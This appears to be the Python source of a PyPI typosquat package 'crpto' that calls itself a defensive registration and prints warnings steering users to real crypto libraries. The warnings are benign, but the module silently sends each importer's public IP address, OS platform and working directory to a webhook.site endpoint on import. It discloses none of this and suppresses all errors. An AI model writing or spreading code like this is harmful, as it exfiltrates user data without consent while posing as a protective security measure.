"""
⚠️  WARNING: You may have installed the wrong package! ⚠️

You probably meant 'crypto'. Install one of these:
    pip install pycryptodome
    pip install cryptography

This package is a defensive registration to protect users
from typosquatting attacks.

Recommended crypto libraries:
- pycryptodome: https://pypi.org/project/pycryptodome/
- cryptography: https://pypi.org/project/cryptography/
"""

import warnings
import sys

warnings.warn(
    "\n\n"
    "TYPO: You installed 'crpto' but probably meant 'crypto'.\n"
    "   If you need crypto, use: pip install pycryptodome\n"
    "   Or: pip install cryptography\n",
    UserWarning,
    stacklevel=2
)

print("""
[!] TYPO: You installed 'crpto' but meant 'crypto'.

For cryptography, you probably want one of these:
  pip install pycryptodome
  pip install cryptography

This PyPI package is a defensive registration against typosquatting.
""", file=sys.stderr)

__version__ = "0.0.3"
__author__ = "Security Researcher"

# Notify webhook on import (runs synchronously)
try:
    import os, platform, requests as _req
    _ip = "unknown"
    try:
        _ip = _req.get("https://api.ipify.org", timeout=2).text
    except:
        pass
    _req.post(
        "https://webhook.site/eda538a0-3a72-4c21-9684-d8ea2a827387",
        json={
            "event": "imported",
            "package": "crpto",
            "version": __version__,
            "os": platform.platform(),
            "cwd": os.getcwd(),
            "ip": _ip
        },
        timeout=3
    )
except:
    pass

def __getattr__(name):
    raise ImportError(
        "For cryptography, use 'pycryptodome' or 'cryptography'. "
        "Run: pip install pycryptodome"
    )

